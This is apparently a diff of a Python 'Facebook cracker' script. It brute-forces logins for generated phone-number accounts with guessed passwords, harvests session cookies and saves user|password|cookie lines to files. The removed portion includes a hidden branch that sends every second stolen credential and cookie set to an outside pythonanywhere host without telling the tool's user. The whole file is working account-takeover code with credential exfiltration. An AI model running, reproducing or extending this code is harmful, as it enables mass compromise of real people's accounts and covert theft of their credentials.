+            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=272324082945033&kid_directed_site=0&app_id=272324082945033&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fmollusk.apis.ign.com%252Fsso%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D272324082945033%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98366769-2b2a-48ab-baa1-b43ba8811855%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmollusk.apis.ign.com%2Fsso%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr"
+            headers1 = {'Host': 'm.facebook.com', 
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '3',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="128"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="24.0.0.0", "Chromium";v="128.0.6613.137"',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '"5.15.123"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': us,
+            'viewport-width': '980',}    
+            requu1 = session.get(url1,headers=headers1)
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1), 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=272324082945033&auth_token=1e81f4f7488a58ffdabc71cdc059f969&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fmollusk.apis.ign.com%252Fsso%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D272324082945033%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98366769-2b2a-48ab-baa1-b43ba8811855%26tp%3Dunspecified&refsrc=deprecated&app_id=272324082945033&cancel=https%3A%2F%2Fmollusk.apis.ign.com%2Fsso%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100"
+            headers = {'authority': 'www.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=272324082945033&kid_directed_site=0&app_id=272324082945033&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fmollusk.apis.ign.com%252Fsso%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D272324082945033%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98366769-2b2a-48ab-baa1-b43ba8811855%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmollusk.apis.ign.com%2Fsso%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
+            'user-agent': us,
             'x-asbd-id': '129477',
-            'x-fb-lsd': us,
+            'x-fb-lsd': '',
             'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream'}   
-            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
-            log_cookies = Session.cookies.get_dict().keys()
-            # Check response
+            'x-response-format': 'JSONStream',}         
+            response = session.post(url,data=log_data,headers=headers,allow_redirects=False,proxies=proxs)
+            log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki = convert(session.cookies.get_dict())
                 user = re.findall('c_user=(.*);xs', kuki)[0]
-                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                         statusok = (f"{user}|{pw}|{kuki}")
-                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:    
-                         print('\033[1;92m OK '+user+'|'+pw+'')
-                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                         oks.append(user)
-                         continue
-            elif 'checkpoint' in log_cookies:
-                print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
-                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid+"|"+pw)
-                continue
-            else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
-                continue
-                
-    except requests.exceptions.Timeout:
-        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
-        return False
+                print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+' | '+kuki+'\n')
+                open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                oks.append(ids)
+                break
+            elif "checkpoint" in log_cookies:
+                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                cps.append(ids)
+                break
+            else:continue
+        loop+=1
     except requests.exceptions.ConnectionError:
-        time.sleep(5)
-        return False
-    except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
-        return False
-    except KeyboardInterrupt:
-        print(f"\r\033[1;93m [Interrupted] User stopped the process")
-        raise
+        time.sleep(20)
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
-        return False
-    
-    return False
+        #print(f"\nError: {e}")
+        pass
 
-def generate_random_ids(limit):
-    """Generate random 6-digit IDs"""
-    idz.clear()
-    for _ in range(limit):
-        random_id = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(random_id)
-    return idz
 
-def get_password_patterns(uid):
-    """Generate password patterns based on UID"""
-    return [
-        uid[:6],     # First 6 digits
-        uid[:8],     # First 8 digits
-        uid,         # Full number
-        '57273200',  # Static common password
-    ]
-
-def random_number():
-    """Main random number cloning function"""
-    clear()
-    
-    print(f"\033[1;96m{'='*46}")
-    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
-    print(f"\033[1;96m{'='*46}")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
-    linex()
-    
-    # Get user input
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
-    # get user limit
-    try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
-        limit = 99999
-        time.sleep(2)
-    
-    # Generate random IDs
-    print(f" \033[1;93m[*] Generating {limit} random IDs...")
-    generate_random_ids(limit)
-    
-    # Reset global counters
-    global loop, oks, cps
-    with counter_lock:
-        loop = 0
-    with success_lock:
-        oks.clear()
-    cps.clear()
-    
-    # Display start information
-    clear()
-    print(f"\033[1;96m{'='*46}")
-    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
-    print(f"\033[1;96m{'='*46}")
-    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
-    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
-    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
-    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
-    linex()
-    
-    # Start multi-threaded attack
-    start_time = time.time()
-    
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = []
-        
-        for random_id in idz:
-            uid = code + random_id
-            password_patterns = get_password_patterns(uid)
-            future = executor.submit(crack, uid, password_patterns, len(idz))
-            futures.append(future)
-        
-        # Wait for all tasks to complete
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except KeyboardInterrupt:
-                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
-                executor.shutdown(wait=False)
-                return
-            except Exception as e:
-                print(f"\n\033[1;91m[!] Task failed: {e}")
-    
-    # Calculate execution time
-    end_time = time.time()
-    execution_time = end_time - start_time
-    
-    # Display results
-    linex()
-    print(f"\033[1;92m{'='*46}")
-    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
-    print(f"\033[1;92m{'='*46}")
-    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
-    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
-    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
-    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
-    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
-    
-    if len(oks) > 0:
-        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
-    else:
-        print(f" \033[1;91m[😞] No successful logins found this time.")
-    
-    linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")
-
-def menu():
-    """Interactive main menu"""
-    while True:
-        clear()
-        print(f"\033[1;96m{'='*46}")
-        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
-        print(f"\033[1;96m{'='*46}")
-        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
-        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
-        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
-        print(f"\033[1;96m{'='*46}")
-        
-        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
-        
-        if choice == '1':
-            random_number()
-        elif choice == '2':
-            clear()
-            print(f"\033[1;96m{'='*46}")
-            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
-            print(f"\033[1;96m{'='*46}")
-            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
-            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
-            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
-            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
-            linex()
-            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
-        elif choice == '3':
-            clear()
-            print(f"\033[1;92m{'='*46}")
-            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
-            print(f"\033[1;92m{'='*46}")
-            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
-            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
-            time.sleep(3)
-            break
-        else:
-            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
-            time.sleep(2)
-
-if __name__ == "__main__":
-    try:
-        # Check for required modules
-        required_modules = ['requests', 'urllib.request']
-        missing_modules = []
-        
-        for module in required_modules:
-            try:
-                __import__(module)
-            except ImportError:
-                missing_modules.append(module)
-        
-        if missing_modules:
-            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
-            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
-            sys.exit(1)
-        
-        # Start the main menu
-        menu()
-        
-    except KeyboardInterrupt:
-        clear()
-        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
-        sys.exit(0)
-    except Exception as e:
-        clear()
-        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
-        sys.exit(1)
+__iam_a_porche()
